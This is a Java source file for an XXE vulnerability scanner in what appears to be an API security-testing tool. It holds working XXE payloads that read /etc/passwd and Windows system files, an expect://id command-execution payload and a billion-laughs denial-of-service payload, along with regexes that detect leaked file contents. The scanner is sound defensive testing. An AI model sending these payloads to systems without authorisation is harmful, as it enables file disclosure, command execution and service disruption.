package active.scanner.xxe;

import active.http.HttpClient;
import active.model.ApiEndpoint;
import active.model.TestRequest;
import active.model.TestResponse;
import active.model.VulnerabilityReport;
import active.scanner.*;
import model.ParameterSpec;
import model.Severity;

import java.time.Instant;
import java.util.*;
import java.util.regex.Pattern;

/**
 * Scanner for detecting XML External Entity (XXE) vulnerabilities.
 *
 * <p>XXE vulnerabilities occur when an XML parser is configured to process external entities,
 * allowing attackers to:
 * <ul>
 *   <li>Read arbitrary files from the server</li>
 *   <li>Perform SSRF attacks</li>
 *   <li>Cause denial of service</li>
 *   <li>Execute remote code in some cases</li>
 * </ul>
 *
 * <p>This scanner tests endpoints that accept XML content.
 */
public final class XxeScanner extends AbstractScanner {

    private static final String SCANNER_ID = "xxe-scanner";
    private static final String SCANNER_NAME = "XXE Scanner";
    private static final String SCANNER_DESCRIPTION =
        "Detects XML External Entity (XXE) vulnerabilities in XML processing";

    // Patterns indicating successful file read via XXE
    private static final List<Pattern> XXE_SUCCESS_PATTERNS = List.of(
        // Unix /etc/passwd content
        Pattern.compile("root:.*:0:0:", Pattern.CASE_INSENSITIVE),
        Pattern.compile("daemon:.*:1:1:", Pattern.CASE_INSENSITIVE),

        // Windows hosts file
        Pattern.compile("127\\.0\\.0\\.1\\s+localhost", Pattern.CASE_INSENSITIVE),

        // XXE test marker
        Pattern.compile("XXE_TEST_SUCCESS", Pattern.CASE_INSENSITIVE),

        // File content indicators
        Pattern.compile("\\[boot loader\\]", Pattern.CASE_INSENSITIVE),
        Pattern.compile("# Copyright.*Microsoft", Pattern.CASE_INSENSITIVE)
    );

    // XXE payloads for different scenarios
    private static final List<XxePayload> XXE_PAYLOADS = List.of(
        // Basic XXE - Unix /etc/passwd
        new XxePayload(
            "basic-unix",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n" +
            "<data>&xxe;</data>",
            "/etc/passwd",
            "Basic XXE - Unix passwd file"
        ),

        // Basic XXE - Windows hosts
        new XxePayload(
            "basic-windows",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/Windows/System32/drivers/etc/hosts\">]>\n" +
            "<data>&xxe;</data>",
            "hosts file",
            "Basic XXE - Windows hosts file"
        ),

        // XXE with wrapper element
        new XxePayload(
            "wrapper-unix",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n" +
            "<root><data>&xxe;</data></root>",
            "/etc/passwd",
            "XXE with wrapper element"
        ),

        // XXE using parameter entity
        new XxePayload(
            "parameter-entity",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE data [\n" +
            "  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n" +
            "  <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'file:///etc/passwd'>\">\n" +
            "  %eval;\n" +
            "]>\n" +
            "<data>&exfil;</data>",
            "/etc/passwd",
            "XXE using parameter entities"
        ),

        // XXE with UTF-16 encoding
        new XxePayload(
            "utf16",
            "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n" +
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n" +
            "<data>&xxe;</data>",
            "/etc/passwd",
            "XXE with UTF-16 encoding"
        ),

        // XXE to read internal file with expect wrapper (PHP)
        new XxePayload(
            "expect-wrapper",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]>\n" +
            "<data>&xxe;</data>",
            "expect://id",
            "XXE with expect wrapper (PHP)"
        ),

        // Billion laughs attack (DoS)
        new XxePayload(
            "billion-laughs",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE lolz [\n" +
            "  <!ENTITY lol \"lol\">\n" +
            "  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
            "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
            "]>\n" +
            "<data>&lol3;</data>",
            "memory",
            "Billion laughs DoS attack"
        ),

        // XXE with custom test content
        new XxePayload(
            "test-marker",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE foo [<!ENTITY xxe \"XXE_TEST_SUCCESS\">]>\n" +
            "<data>&xxe;</data>",
            "test marker",
            "XXE test with custom marker"
        )
    );

    public XxeScanner() {
        super();
    }

    public XxeScanner(ScannerConfig config) {
        super(config);
    }

    @Override
    public String getId() {
        return SCANNER_ID;
    }

    @Override
    public String getName() {
        return SCANNER_NAME;
    }

    @Override
    public String getDescription() {
        return SCANNER_DESCRIPTION;
    }

    @Override
    public List<VulnerabilityReport.VulnerabilityType> getDetectedVulnerabilities() {
        return List.of(VulnerabilityReport.VulnerabilityType.XXE);
    }

    @Override
    public boolean isApplicable(ApiEndpoint endpoint) {
        // XXE is only relevant for endpoints that might accept XML
        // Check for XML-related indicators

        // Check if endpoint accepts XML content type
        String path = endpoint.getPath().toLowerCase();
        boolean hasXmlKeywords = path.contains("xml") ||
                                 path.contains("soap") ||
                                 path.contains("rss") ||
                                 path.contains("feed");

        // Check if it's a POST/PUT/PATCH endpoint (can send XML body)
        String method = endpoint.getMethod();
        boolean canHaveBody = method.equals("POST") ||
                             method.equals("PUT") ||
                             method.equals("PATCH");

        return hasXmlKeywords || canHaveBody;
    }

    @Override
    protected ScanResult performScan(ApiEndpoint endpoint, HttpClient httpClient, ScanContext context) {
        Instant startTime = Instant.now();
        List<VulnerabilityReport> vulnerabilities = new ArrayList<>();
        int totalTests = 0;

        logger.info("Starting XXE scan on: " + endpoint);

        // Test XXE with various payloads
        XxeTestResult result = testXxeVulnerability(endpoint, httpClient, context);
        totalTests += result.testsExecuted();
        if (result.vulnerability().isPresent()) {
            vulnerabilities.add(result.vulnerability().get());
        }

        return createSuccessResult(endpoint, vulnerabilities, totalTests, startTime);
    }

    /**
     * Test for XXE vulnerability by sending XML payloads.
     */
    private XxeTestResult testXxeVulnerability(
        ApiEndpoint endpoint,
        HttpClient httpClient,
        ScanContext context
    ) {
        logger.fine("Testing XXE vulnerability for: " + endpoint);

        int testsExecuted = 0;

        for (XxePayload payload : XXE_PAYLOADS) {
            // Test with application/xml content type
            TestRequest xmlRequest = createXmlRequest(endpoint, context, payload.xml(), "application/xml");
            TestResponse xmlResponse = executeTest(httpClient, xmlRequest,
                "XXE: " + payload.description() + " (application/xml)");
            testsExecuted++;

            if (containsXxeIndicator(xmlResponse)) {
                return new XxeTestResult(
                    Optional.of(createVulnerability(endpoint, payload, xmlRequest, xmlResponse, "application/xml")),
                    testsExecuted
                );
            }

            // Also test with text/xml content type
            TestRequest textXmlRequest = createXmlRequest(endpoint, context, payload.xml(), "text/xml");
            TestResponse textXmlResponse = executeTest(httpClient, textXmlRequest,
                "XXE: " + payload.description() + " (text/xml)");
            testsExecuted++;

            if (containsXxeIndicator(textXmlResponse)) {
                return new XxeTestResult(
                    Optional.of(createVulnerability(endpoint, payload, textXmlRequest, textXmlResponse, "text/xml")),
                    testsExecuted
                );
            }

            // For POST endpoints, also try as query parameter (edge case)
            if (!endpoint.getQueryParameters().isEmpty() && endpoint.getMethod().equals("GET")) {
                ParameterSpec firstParam = endpoint.getQueryParameters().get(0);
                TestRequest paramRequest = createRequestWithXmlParameter(
                    endpoint,
                    context,
                    firstParam.getName(),
                    payload.xml()
                );
                TestResponse paramResponse = executeTest(httpClient, paramRequest,
                    "XXE in parameter: " + payload.description());
                testsExecuted++;

                if (containsXxeIndicator(paramResponse)) {
                    return new XxeTestResult(
                        Optional.of(createParameterVulnerability(endpoint, firstParam.getName(), payload, paramRequest, paramResponse)),
                        testsExecuted
                    );
                }
            }
        }

        return new XxeTestResult(Optional.empty(), testsExecuted);
    }

    /**
     * Check if response contains evidence of XXE exploitation.
     */
    private boolean containsXxeIndicator(TestResponse response) {
        // Check for successful response
        if (response.getStatusCode() != 200) {
            return false;
        }

        String body = response.getBody();
        if (body == null || body.isEmpty()) {
            return false;
        }

        // Check for file content patterns
        return XXE_SUCCESS_PATTERNS.stream()
            .anyMatch(pattern -> pattern.matcher(body).find());
    }

    /**
     * Create an HTTP request with XML body.
     */
    private TestRequest createXmlRequest(
        ApiEndpoint endpoint,
        ScanContext context,
        String xmlContent,
        String contentType
    ) {
        String url = context.buildUrl(endpoint.getPath());

        return TestRequest.builder()
            .url(url)
            .method(endpoint.getMethod())
            .headers(context.getAuthHeaders())
            .addHeader("Content-Type", contentType)
            .body(xmlContent)
            .build();
    }

    /**
     * Create a request with XML in query parameter (edge case).
     */
    private TestRequest createRequestWithXmlParameter(
        ApiEndpoint endpoint,
        ScanContext context,
        String paramName,
        String xmlContent
    ) {
        String url = context.buildUrl(endpoint.getPath()) + "?" + paramName + "=" + xmlContent;

        return TestRequest.builder()
            .url(url)
            .method(endpoint.getMethod())
            .headers(context.getAuthHeaders())
            .build();
    }

    private VulnerabilityReport createVulnerability(
        ApiEndpoint endpoint,
        XxePayload payload,
        TestRequest request,
        TestResponse response,
        String contentType
    ) {
        return VulnerabilityReport.builder()
            .type(VulnerabilityReport.VulnerabilityType.XXE)
            .severity(Severity.CRITICAL)
            .endpoint(endpoint)
            .title("XML External Entity (XXE) Injection")
            .description(
                "The endpoint is vulnerable to XML External Entity (XXE) injection. " +
                "The XML parser processes external entities without proper restrictions, " +
                "allowing attackers to read arbitrary files from the server. " +
                "Successfully accessed: " + payload.targetFile() + " using XXE payload."
            )
            .exploitRequest(request)
            .exploitResponse(response)
            .addEvidence("payloadType", payload.name())
            .addEvidence("contentType", contentType)
            .addEvidence("targetFile", payload.targetFile())
            .addEvidence("statusCode", response.getStatusCode())
            .addRecommendation("Disable XML external entity processing in all XML parsers")
            .addRecommendation("Use less complex data formats like JSON when possible")
            .addRecommendation("Configure XML parsers to disable DTD processing")
            .addRecommendation("Implement input validation and whitelist acceptable XML schemas")
            .addRecommendation("Use up-to-date XML processors with secure defaults")
            .addRecommendation("Apply the principle of least privilege for file system access")
            .reproductionSteps(
                "1. Send " + endpoint.getMethod() + " request to " + request.getUrl() + "\n" +
                "2. Set Content-Type header to: " + contentType + "\n" +
                "3. Include XXE payload in request body:\n" + payload.xml() + "\n" +
                "4. Observe file content in response (target: " + payload.targetFile() + ")"
            )
            .build();
    }

    private VulnerabilityReport createParameterVulnerability(
        ApiEndpoint endpoint,
        String paramName,
        XxePayload payload,
        TestRequest request,
        TestResponse response
    ) {
        return VulnerabilityReport.builder()
            .type(VulnerabilityReport.VulnerabilityType.XXE)
            .severity(Severity.HIGH)
            .endpoint(endpoint)
            .title("XML External Entity (XXE) Injection in Parameter")
            .description(
                "The endpoint is vulnerable to XXE injection through the '" + paramName + "' parameter. " +
                "The application processes XML from query parameters without proper entity restrictions."
            )
            .exploitRequest(request)
            .exploitResponse(response)
            .addEvidence("parameter", paramName)
            .addEvidence("payloadType", payload.name())
            .addEvidence("targetFile", payload.targetFile())
            .addRecommendation("Disable XML external entity processing in all XML parsers")
            .addRecommendation("Validate and sanitize all user inputs")
            .addRecommendation("Use JSON instead of XML for API parameters")
            .reproductionSteps(
                "1. Send request with XML in parameter '" + paramName + "'\n" +
                "2. Observe file content in response"
            )
            .build();
    }

    private record XxePayload(String name, String xml, String targetFile, String description) {}

    private record XxeTestResult(
        Optional<VulnerabilityReport> vulnerability,
        int testsExecuted
    ) {}
}
